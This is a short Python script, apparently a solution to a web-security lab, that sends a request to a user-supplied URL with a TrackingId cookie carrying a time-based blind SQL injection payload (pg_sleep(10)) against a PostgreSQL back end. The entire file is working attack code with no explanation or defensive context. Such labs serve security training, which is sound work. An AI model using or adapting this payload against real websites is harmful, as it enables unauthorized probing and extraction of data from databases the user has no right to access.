import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]


burp0_cookies = {"TrackingId": "x'||pg_sleep(10)--"}
requests.get(burp_url, cookies=burp0_cookies)
